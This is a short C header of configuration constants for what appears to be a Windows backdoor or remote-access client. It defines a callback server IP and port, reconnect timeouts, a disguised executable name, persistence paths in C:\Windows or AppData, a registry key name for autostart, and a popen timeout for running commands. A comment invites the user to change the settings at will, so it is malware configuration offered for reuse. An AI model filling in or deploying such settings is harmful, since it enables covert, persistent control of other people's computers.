#ifndef COMMON_H
#define COMMON_H

#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "192.168.0.98" //Ip of server
#define PORT 8888 //Port of server
#define AUTO_PERSISTENCE false
#define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
#define TIMEOUT_SOCK 3

#define SLEEP_RECV 200 // DO NOT TOUCH 
#define NAME_PROG "12.exe" //Name of prog
#define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming" // DO NOT TOUCH
#define TIMEOUT_POPEN 7 // DO NOT TOUCH
#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
#define TOKEN "|GENERATE_TOKEN|"
#define SPLIT "|SPLIT|" 

#endif

/*
$USER is changed by the user who executed the program.
*/